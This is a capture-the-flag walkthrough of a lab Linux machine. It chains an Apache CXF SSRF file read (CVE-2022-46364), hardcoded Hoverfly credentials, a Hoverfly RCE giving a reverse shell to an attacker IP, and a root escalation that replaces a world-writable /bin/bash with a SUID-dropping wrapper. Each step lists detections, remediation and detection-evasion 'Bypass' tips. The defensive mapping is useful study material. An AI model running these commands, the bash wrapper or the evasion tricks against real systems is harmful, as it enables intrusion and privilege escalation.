# DevArea

**Platform:** Linux: Medium

---

## Summary

DevArea exposes a Java SOAP web service packaged as a runnable JAR, a Hoverfly traffic simulation proxy dashboard, and an anonymous FTP server that hands out the application binary. Decompiling the JAR with jadx identifies the CXF framework version and the WSDL endpoint, pointing directly to CVE-2022-46364, a server-side request forgery in Apache CXF that allows reading arbitrary local files by injecting a `file://` URI into a SOAP attachment. The SSRF is used to read the Hoverfly systemd unit file, which contains hardcoded admin credentials in the `ExecStart` line. Authenticating to the Hoverfly dashboard yields a JWT, which is passed to a known RCE exploit for CVE-2025-54123 to get a shell as `dev_ryan`. Privilege escalation abuses a `sudo` rule that allows running a shell script as root, combined with world-writable permissions on `/bin/bash`: the binary is replaced with a malicious wrapper that drops a SUID copy of the real bash when the sudo script executes it.

---

## Methodology Notes

The FTP server was the natural starting point given anonymous login was permitted, and the JAR it contained explained everything else on the port list. jadx-gui is significantly faster than manual grep for navigating compiled Java: the `ServerStarter` class surfaced within seconds of opening the JAR and immediately identified the CXF framework, the listening address, and the WSDL path.

The pivot from SSRF to the Hoverfly credentials was intentional rather than lucky. When a service is running as a systemd unit, the `ExecStart` line in the unit file is the most reliable place to find credentials passed as flags at startup: developers frequently hardcode these rather than using environment files or secrets managers. The Hoverfly documentation confirms `-username` and `-password` are valid startup flags, so the unit file at `/etc/systemd/system/hoverfly.service` was a targeted read.

The world-writable `/bin/bash` is an unusual misconfiguration and easy to miss if the privilege escalation focus stays entirely on the sudo rule. Checking binary permissions on anything a sudo script might invoke is a habit that paid off here: the sudo restriction (`!web-stop`, `!web-restart`) prevented the obvious path but the writable bash made those restrictions irrelevant.

---

## Recon

### Step 1: Port Scan | T1046

A fast full TCP scan establishes the attack surface. Several ports are open and the banner grab confirms a mixed service stack.

```
nmap -p- --min-rate 3000 10.129.21.229
```

**Findings:** Six open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 8080 (HTTP), 8500 (HTTP proxy), 8888 (HTTP).

```
nmap -p21,22,80,8080,8500,8888 -sCV 10.129.21.229
```

**Findings:** FTP on port 21 runs vsftpd 3.0.5 with anonymous login permitted and a `pub` directory. Port 80 is Apache 2.4.58 redirecting to `http://devarea.htb/`. Port 8080 is Jetty 9.4.27 serving a 404. Port 8500 is a Golang HTTP server identifying itself as a proxy in its error body. Port 8888 is also a Golang server whose title is "Hoverfly Dashboard": Hoverfly is a service virtualisation and traffic simulation tool. The redirect on port 80 means `devarea.htb` is added to `/etc/hosts`.

**Logs Generated:**
1. Apache access log records the redirect probe on port 80
2. Jetty access log records the probe on port 8080
3. Hoverfly access log records the probe on port 8888

**Alerts Triggered:**
1. Rate-based IDS alert if the `--min-rate 3000` scan exceeds connection-per-second thresholds
2. Port-scan signature in network IDS (SYN flood pattern across all 65535 ports)

**Network Artifacts:**
1. Half-open TCP connections to every port from a single source IP
2. Sequential port probe pattern visible in flow data

**Artifacts Left:**
1. Source IP recorded in all service access logs that responded to the probe

**Sysmon/EDR:** N/A: Linux. Auditd `connect` syscall rules could capture inbound connection attempts at the kernel level.

**SIEM Correlation:**
1. Alert on single source IP establishing connections across more than N distinct ports within a short window
2. Correlate nmap-style SYN pattern against threat intelligence feeds for known scanner IPs

**Sigma Rule:** [network_scan_nmap](https://github.com/SigmaHQ/sigma/search?q=nmap+scan): community rules targeting nmap User-Agent in HTTP probes and sequential SYN patterns.

**Bypass:** Use a lower `--min-rate`, distribute scan across multiple source IPs, or use a decoy scan (`-D`) to obscure the true origin.

**Remediation:** Restrict public exposure of internal services: port 8080, 8500, and 8888 should not be reachable from external networks. Implement network segmentation so development services are isolated from the internet-facing attack surface.

**OpSec Rating:** Loud. A 3000-packet-per-second full port scan against a single host is trivially detected by any flow-monitoring solution.

---

## Enumeration

### Step 2: FTP Anonymous Login and JAR Retrieval | T1190, T1083

Anonymous FTP is permitted. The `pub` directory contains an application JAR.

```
ftp 10.129.21.229
```

Once connected as `anonymous`, the JAR is retrieved:

```
get employee-service.jar
```

The JAR contents are inspected for structure and interesting files before decompilation:

```
zipinfo employee-service.jar | less
```

```
jar tf employee-service.jar
```

**Findings:** The JAR includes a `META-INF/MANIFEST.MF` identifying the main class as `htb.devarea.ServerStarter`, built with JDK 1.8.0_462 and Apache Maven 3.8.7. The presence of Apache CXF in the dependency tree is immediately relevant given the version can be cross-referenced against known CVEs.

**Logs Generated:**
1. vsftpd logs the anonymous login with source IP and all file transfer operations

**Alerts Triggered:**
1. Alert on anonymous FTP login from an external IP if FTP authentication is monitored
2. Alert on file download via anonymous FTP (unusual for most production environments)

**Network Artifacts:**
1. FTP control and data connections from attacker IP to port 21
2. File transfer volume visible in flow records

**Artifacts Left:**
1. FTP access log entry with source IP, username `anonymous`, and filename `employee-service.jar`

**Sysmon/EDR:** N/A: Linux.

**SIEM Correlation:**
1. Alert on anonymous FTP authentication from any source IP
2. Correlate FTP file download events with subsequent exploitation attempts from the same source IP

**Sigma Rule:** [ftp_anonymous_login](https://github.com/SigmaHQ/sigma/search?q=ftp+anonymous): rules targeting anonymous FTP authentication events in auth logs.

**Bypass:** Anonymous FTP is an open access channel by definition: there is nothing to bypass.

**Remediation:** Disable anonymous FTP. If a public file distribution mechanism is required, use a web server with access logging and optional authentication rather than FTP. If FTP cannot be removed, ensure the `pub` directory contains only files intended for public distribution and audit its contents regularly.

**OpSec Rating:** Silent. Anonymous FTP login is expected and indistinguishable from normal use.

---

### Step 3: JAR Decompilation and Service Discovery | T1083

The JAR is decompiled with jadx-gui to recover the source. The `ServerStarter` class is located and read directly.

```
jadx-gui employee-service.jar
```

The relevant class found during review:

```java
public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("Employee Service running at http://localhost:8080/employeeservice");
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

The WSDL is confirmed accessible:

```
curl -k http://devarea.htb:8080/employeeservice?wsdl
```

**Findings:** The service is built on Apache CXF (`import org.apache.cxf.*`). The WSDL is publicly accessible and describes the full service contract. Cross-referencing the Apache CXF security advisories at `https://cxf.apache.org/security-advisories.html` identifies CVE-2022-46364: a critical SSRF vulnerability in CXF versions prior to 3.5.5 / 4.0.0 that allows reading arbitrary files via a malicious `file://` URI in a SOAP attachment reference.

**Logs Generated:**
1. Jetty access log records the WSDL request

**Alerts Triggered:**
1. No automated alert is typical for WSDL access: it is a designed-for-public endpoint

**Network Artifacts:**
1. HTTP GET to `/employeeservice?wsdl` from attacker IP

**Artifacts Left:**
1. Jetty access log entry

**Sysmon/EDR:** N/A: Linux.

**SIEM Correlation:**
1. Correlate WSDL enumeration against subsequent SOAP request anomalies from the same source IP

**Sigma Rule:** No specific SigmaHQ rule targets WSDL enumeration. Generic web enumeration rules at [web_application_enumeration](https://github.com/SigmaHQ/sigma/search?q=web+enumeration) may apply.

**Bypass:** WSDL access is legitimate by design. No bypass required.

**Remediation:** Restrict WSDL access to authenticated or network-restricted clients. Do not expose SOAP service endpoints directly to the internet without a gateway that enforces authentication. Upgrade Apache CXF to a version that patches CVE-2022-46364.

**OpSec Rating:** Low noise. A single WSDL fetch is functionally identical to normal developer or integration activity.

---

## Exploitation

### Step 4: CVE-2022-46364: Apache CXF SSRF for Arbitrary File Read | T1190, T1005

CVE-2022-46364 affects Apache CXF's MTOM (Message Transmission Optimization Mechanism) attachment handling. When a SOAP request includes an attachment reference using the `file://` scheme, CXF fetches the referenced resource and returns its contents in the SOAP response without validation. This allows reading any file accessible to the JVM process from a remote unauthenticated request.

A public proof-of-concept is cloned and used directly:

```
git clone https://github.com/kasem545/CVE-2022-46364-Poc.git
```

The SSRF is used first to confirm arbitrary file read and identify local users:

```
python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/passwd -d devarea.htb
```

**Findings:** `/etc/passwd` is returned. Local users of interest are `root` (uid 0, shell `/bin/bash`) and `dev_ryan` (uid 1001, shell `/bin/bash`). The Hoverfly service is already known to be running. Standard Hoverfly deployments use a systemd unit file. The `ExecStart` line in systemd unit files commonly contains credentials passed as command-line flags. The unit file is read directly:

```
python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb
```

**Findings:** The unit file content is returned in full:

```
[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

This reveals that Hoverfly runs as `dev_ryan`, and the admin credentials `admin:O7IJ27MyyXiU` are hardcoded in the service definition. These are verified against the dashboard at `http://devarea.htb:8888/login`, confirming access. The Hoverfly version is identified as 1.11.3.

**Logs Generated:**
1. Jetty/CXF logs the inbound SOAP request containing the malicious attachment reference
2. The JVM process generates a file read against the local filesystem: this may appear in auditd `open` syscall logs if configured
3. Hoverfly access log records the login attempt

**Alerts Triggered:**
1. SIEM alert if SOAP request bodies are inspected and `file://` URIs are detected in attachment content-location headers
2. Alert on file read of `/etc/passwd` by a Jetty process: web services should not be reading system files

**Network Artifacts:**
1. SOAP POST to `/employeeservice` with a crafted body from the attacker IP
2. No outbound network artifact: the SSRF is purely local filesystem access in this case

**Artifacts Left:**
1. Full SOAP request body in Jetty access or request logs, containing the `file:///etc/passwd` reference
2. Auditd `openat` syscall record if audit rules cover the Jetty process

**Sysmon/EDR:** N/A: Linux. Auditd file access rules targeting the Jetty process reading system files would be a high-fidelity detection.

**SIEM Correlation:**
1. Alert on `openat` syscall by the Jetty/CXF process user against paths outside its working directory (`/etc/passwd`, `/etc/systemd/`)
2. Correlate SOAP request anomalies: specifically `file://` in request bodies: with file system access events in the same process timeline

**Sigma Rule:** [ssrf_via_file_protocol](https://github.com/SigmaHQ/sigma/search?q=ssrf+file): rules exist for SSRF via `file://` protocol in application request logs. CXF-specific rules may need to be written based on the SOAP request pattern.

**Bypass:** Encode the `file://` URI using URL encoding or XML character entities to bypass WAF rules matching the literal `file://` string in SOAP bodies.

**Remediation:** Upgrade Apache CXF to 3.5.5 or 4.0.0 or later, which validates MTOM attachment URI schemes and blocks `file://` references. If upgrade is not immediately possible, disable MTOM processing at the CXF configuration level. Never pass credentials as command-line flags to systemd services: use `EnvironmentFile` with a `0600`-permissions file containing secrets, or a secrets management solution. Rotate the `O7IJ27MyyXiU` credential immediately.

**OpSec Rating:** Medium. The SSRF generates unusual SOAP traffic that is detectable at the application layer but typically not monitored in environments without dedicated API security tooling.

---

### Step 5: CVE-2025-54123: Hoverfly RCE to Shell as dev_ryan | T1068

Hoverfly 1.11.3 is affected by CVE-2025-54123, a remote code execution vulnerability exploitable by an authenticated user. A public exploit is cloned. A listener is opened on the attacker machine before triggering the payload:

```
nc -lvnp 4444
```

The exploit requires the Hoverfly host, dashboard port, attacker IP, listener port, and a valid JWT obtained from the Hoverfly API after authentication. The JWT from the authenticated session is extracted and passed directly:

```
git clone https://github.com/0xzap/CVE-2025-54123
```

```
python3 cve-2025-54123.py devarea.htb 8888 10.10.16.145 4444 eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxMjMxMzEsImlhdCI6MTc3NTA4MzEzMSwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.UaVV5RU7cjXM6F5ICzmVgsa48LVaeIzCg9EXRxmjh56YS780ZFk5QcEqlWZrrJIFC1j0WndNN5FBQURbdblKcw
```

**Findings:** A reverse shell connects to the listener. `whoami` returns `dev_ryan`: consistent with the `User=dev_ryan` directive in the Hoverfly systemd unit.

**Logs Generated:**
1. Hoverfly access log records the authenticated API requests made by the exploit
2. Auditd `execve` records the process spawned by Hoverfly that produces the shell
3. Network connection from the server to `10.10.16.145:4444` logged in firewall or flow records

**Alerts Triggered:**
1. Critical alert: outbound TCP connection from a Hoverfly process to an external IP on a non-standard port: this is the reverse shell and is the highest-confidence indicator in this step
2. SIEM alert on process creation by the Hoverfly process that spawns a shell binary

**Network Artifacts:**
1. TCP connection from `devarea.htb` to `10.10.16.145:4444`: the reverse shell channel
2. Preceding authenticated API traffic to Hoverfly on port 8888

**Artifacts Left:**
1. Hoverfly API request log containing the exploit payload
2. Auditd process creation records for the shell spawned by Hoverfly
3. Outbound connection logged in `/var/log/` firewall or netfilter records if present

**Sysmon/EDR:** N/A: Linux. Auditd `execve` and `connect` rules on the Hoverfly process would catch both the process spawning and the outbound connection.

**SIEM Correlation:**
1. Correlate authenticated Hoverfly API requests with a subsequent outbound TCP connection from the same process: this sequence has no legitimate use case
2. Alert on process creation by a service-account process (`dev_ryan`) that spawns an interactive shell

**Sigma Rule:** [reverse_shell_detection](https://github.com/SigmaHQ/sigma/search?q=reverse+shell): rules targeting bash/sh process creation by non-interactive parent processes apply. Outbound TCP connection rules from service processes at [network_connection_non_standard_port](https://github.com/SigmaHQ/sigma/search?q=outbound+reverse+shell) are also relevant.

**Bypass:** Use an encrypted reverse shell (socat with OpenSSL, or Meterpreter) to defeat payload inspection. Route the outbound connection through a port that is expected to be open (443) to blend with normal HTTPS traffic.

**Remediation:** Upgrade Hoverfly to a version that patches CVE-2025-54123. Hoverfly should not be exposed on a public interface: bind it to localhost or a management VLAN only. Implement outbound firewall rules that deny unexpected TCP connections from the Hoverfly process. Enforce network egress filtering at the host level.

**OpSec Rating:** Medium. The outbound reverse shell is loud, but the exploit traffic itself blends with normal API usage until the shell is established.

---

## Privilege Escalation

### Step 6: World-Writable /bin/bash and sudo Script Hijack | T1548.003, T1574

Enumerating sudo rights and checking binary permissions reveals the privilege escalation path.

```
sudo -l
```

**Findings:**

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

`syswatch.sh` can be run as root without a password, with two specific argument combinations blocked. However the script itself is not readable:

```
cat /opt/syswatch/syswatch.sh
```

**Findings:** `Permission denied`: the script's content cannot be inspected. However, the permissions on `/bin/bash` reveal a far more direct path:

```
ls -l /bin/bash
```

**Findings:** `-rwxrwxrwx 1 root root 1446024 Mar 31 2024 /bin/bash`: `/bin/bash` is world-writable. Any shell script that invokes `bash`: including `syswatch.sh` running as root: will execute whatever binary is at that path. The real bash binary is preserved first to avoid breaking the system, then the path is replaced with a malicious wrapper:

```
cp /bin/bash /tmp/realbash
```

```
cat > /bin/bash << 'EOF'
#!/bin/sh
cp /tmp/realbash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Root SUID bash created in /tmp/rootbash"
exec /tmp/realbash "$@"
EOF
```

```
chmod +x /bin/bash
```

The sudo script is triggered with an innocuous argument to avoid the blocked `web-stop` and `web-restart` arguments:

```
sudo /opt/syswatch/syswatch.sh --version
```

**Findings:** The wrapper executes as root, copies the real bash to `/tmp/rootbash`, and applies the SUID bit. The SUID binary is then invoked with `-p` to prevent privilege dropping:

```
/tmp/rootbash -p
```

```
id
```

**Findings:** `uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root)`: effective UID is root. The root flag is readable.

**Logs Generated:**
1. Auditd records the `write` syscall to `/bin/bash`: this is a high-severity file integrity event
2. Auditd `execve` records the sudo call to `syswatch.sh` as root
3. Auditd records the `chmod` and `cp` operations creating `/tmp/rootbash`
4. sudo logs the command execution in `/var/log/auth.log`

**Alerts Triggered:**
1. File integrity monitoring (FIM) critical alert: `/bin/bash` modified: this is one of the most sensitive binaries on a Linux system and any modification should fire an immediate P1 alert
2. SIEM alert on SUID bit being set on a binary in `/tmp`: `chmod 4755` on any file in `/tmp` is a known privilege escalation indicator
3. sudo execution log shows `syswatch.sh` running as root

**Network Artifacts:**
1. None: this entire escalation is local

**Artifacts Left:**
1. Modified `/bin/bash` on disk: the file's mtime changes and its content no longer matches the distribution package hash
2. `/tmp/realbash` and `/tmp/rootbash` on disk
3. sudo log entry in `/var/log/auth.log`
4. Auditd records of all file write and chmod operations

**Sysmon/EDR:** N/A: Linux. This escalation would be caught immediately by any FIM solution (AIDE, Wazuh, Falco) watching `/bin/bash`. Falco has a default rule that alerts on writes to system binaries.

**SIEM Correlation:**
1. Critical: write to `/bin/bash` by a non-root process: this should never occur in a healthy system
2. Alert on `chmod` setting the SUID bit on a file in `/tmp`: correlate with preceding sudo execution from the same session
3. Correlate FIM alert on `/bin/bash` with the time of the sudo call to build the full escalation timeline

**Sigma Rule:** [linux_bin_modification](https://github.com/SigmaHQ/sigma/search?q=linux+binary+modification): rules targeting writes to system binary paths. [suid_binary_creation_tmp](https://github.com/SigmaHQ/sigma/search?q=suid+tmp): rules targeting SUID bit set on files in `/tmp` or world-writable directories.

**Bypass:** In a FIM-monitored environment this approach fails immediately. An alternative would be to hijack a library or PATH entry rather than modifying a monitored system binary directly. If a writable directory appears earlier in root's `PATH` than `/bin`, dropping a fake binary there achieves the same result with less visibility.

**Remediation:** Fix `/bin/bash` permissions to `0755` immediately: world-writable system binaries are a critical misconfiguration that enables trivial privilege escalation regardless of any other control. Implement a FIM solution (Wazuh, AIDE, or Falco) with rules covering all binaries in `/bin`, `/usr/bin`, `/sbin`, and `/usr/sbin`. Review the sudo rule for `syswatch.sh`: if the script must be run as root, ensure it uses an absolute path for all internal interpreter invocations and validates its own integrity at startup. Restrict sudo NOPASSWD grants to the minimum necessary scope.

**OpSec Rating:** Loud. Writing to `/bin/bash` is among the highest-severity filesystem events on a Linux host. Any FIM solution catches this in real time.

---

## Detection Map

| Step | Technique | MITRE ID | Detectability |
|---|---|---|---|
| Port scan | Network Service Scanning | T1046 | Medium: rate-based IDS |
| Anonymous FTP + JAR download | Exploit Public-Facing App | T1190, T1083 | Low: expected anonymous FTP behaviour |
| JAR decompilation / WSDL fetch | Gather Victim Host Information | T1592 | Low: single benign-looking request |
| CVE-2022-46364 SSRF file read | Exploit Public-Facing App | T1190, T1005 | Medium: `file://` in SOAP body |
| Hoverfly credential from unit file | Unsecured Credentials in Files | T1552.001 | Low: passive file read, no process |
| CVE-2025-54123 Hoverfly RCE | Exploitation for Privilege Escalation | T1068 | High: outbound reverse shell from service |
| World-writable bash hijack | Abuse Elevation Control | T1548.003 | Critical: FIM alert on `/bin/bash` |
| SUID bash in /tmp | Setuid/Setgid | T1548.001 | High: SUID set in `/tmp` |

---

## Would I Get Caught

On a real engagement, the early phases of this attack: port scanning, anonymous FTP, WSDL enumeration: generate noise but are unlikely to trigger an immediate response in most environments. Anonymous FTP is often intentionally permitted and the WSDL fetch is indistinguishable from legitimate developer activity. The SSRF via CVE-2022-46364 is where the first high-confidence signal appears: `file://` URIs in SOAP bodies have no legitimate business use, and an API security gateway or WAF with SOAP inspection would flag this immediately.

The Hoverfly RCE is the step that would end a real engagement in any environment with egress monitoring. An outbound TCP connection from a service-account process to a non-standard port is an unambiguous indicator, and most modern NGFWs would block it before the shell established. DNS exfiltration or an HTTPS reverse shell over port 443 would be required to proceed silently.

The privilege escalation is where this machine most closely mirrors a real-world misconfiguration. World-writable system binaries are not theoretical: they appear in misconfigured containers, poorly imaged VMs, and environments where someone ran `chmod 777` to solve a permissions problem quickly. However, any FIM solution with default rules would fire a critical alert the moment `/bin/bash` was written to. In a monitored environment this escalation would be detected within seconds; in an unmonitored environment it completes invisibly. The decisive factor is whether host-level telemetry exists at all, which in many medium-sized organisations it does not.
